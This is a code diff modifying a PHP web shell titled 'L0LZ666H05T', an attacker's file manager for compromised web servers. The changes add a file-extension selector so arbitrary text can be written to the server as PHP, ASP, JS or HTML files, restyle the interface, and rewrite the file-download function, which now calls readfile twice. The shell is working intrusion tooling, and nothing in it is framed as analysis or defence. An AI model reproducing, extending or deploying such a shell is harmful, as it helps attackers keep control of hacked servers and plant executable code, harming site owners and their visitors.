@@ -5,15 +5,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-
-  <title>L0LZ666H05T</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>L0LZ666H05T</title>
 </head>
 <style type="text/css">
 @import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
 body {
   font-family: 'Ubuntu Mono', monospace;
   color: #8a8a8a;
-  background:#fff;
+  background:rgba(222,222,222,0.73);
 }
 
 table {
@@ -22,7 +22,7 @@ table {
   border-collapse: separate;
   border-spacing: 0;
   border: 25px solid #fff;
-  width: 60%;
+  width: 100%;
   margin: 50px auto;
   border-radius: .25rem;
   box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
@@ -402,7 +402,7 @@ function making($post) {
     ?>
     <thead>
       <tr>
-        <th>
+        <th colspan="2">
           <a class="back" href="?path=<?php print @cwd() ?>">MAKE FILE & DIRECTORY</a>
         </th>
       </tr>
@@ -410,10 +410,27 @@ function making($post) {
     <?php
     if (isset($_POST['submit'])) {
       if ($_POST['type'] == 'file') {
-        if (@makefile($_POST['filename'], $_POST['text'])) {
+        switch ($_POST['file_name']) {
+          case 'html':
+            $_mode = "html";
+            break;
+          case 'php':
+            $_mode = "php";
+            break;
+          case 'css':
+            $_mode = "css";
+            break;
+          case 'asp':
+            $_mode = "asp";
+            break;
+          case 'js':
+            $_mode = "js";
+            break;
+        }
+        if (@makefile($_POST['filename'].".".$_mode, $_POST['text'])) {
           ?>
           <tr>
-            <td>
+            <td colspan="2">
               <?php print @failed("Create File ".$_POST['filename']." Failed") ?>
             </td>
           </tr>
@@ -421,7 +438,7 @@ function making($post) {
         } else {
           ?>
           <tr>
-            <td>
+            <td colspan="2">
               <?php print @success("Create File ".$_POST['filename']." Successfully") ?>
             </td>
           </tr>
@@ -454,7 +471,7 @@ function making($post) {
     ?>
     <form method="post">
       <tr>
-        <td>
+        <td colspan="2">
           <select style="width:100%;" name="type">
             <option value="file">FILE</option>
             <option value="dir">DIRECTORY</option>
@@ -462,17 +479,28 @@ function making($post) {
         </td>
       </tr>
       <tr>
+        <td style="width:50px;">
+          <select name="file_name">
+            <option value="html">html</option>
+            <option value="php">php</option>
+            <option value="css">css</option>
+            <option value="asp">asp</option>
+            <option value="js">js</option>
+          </select>
+        </td>
         <td>
-          <input style="width:98.3%;" type="text" name="filename" placeholder="Filename: sfx* please empty this form if you want create DIRECTORY">
+          <center>
+          <input style="width:98.9%;" type="text" name="filename" placeholder="Filename: sfx* please empty this form if you want create DIRECTORY">
+        </center>
         </td>
       </tr>
       <tr>
-        <td>
-          <textarea name="text" placeholder="Your text"></textarea>
+        <td colspan="2">
+          <textarea style="width:99.5%;" name="text" placeholder="Your text"></textarea>
         </td>
       </tr>
       <tr>
-        <td>
+        <td colspan="2">
           <input style="width:100%;" type="submit" name="submit">
         </td>
       </tr>
@@ -722,15 +750,15 @@ function delete($filename) {
 }
 function download($post, $filename) {
   if ($_GET['do'] == $post) {
-    header("Pragma: public");
-    header("Expires: 0");
-    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
-    header("Content-Type: application/force-download");
-    header("Content-Type: application/octet-stream");
-    header("Content-Type: application/download");
-    header("Content-Disposition: attachment; filename=".basename($filename).";");
-    header("Content-Transfer-Encoding: binary");
-    header("Content-Length: ".filesize($filename));
+    @ob_clean();
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($filename).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($filename));
+    readfile($filename);
   
     @readfile($filename);
     exit(0);
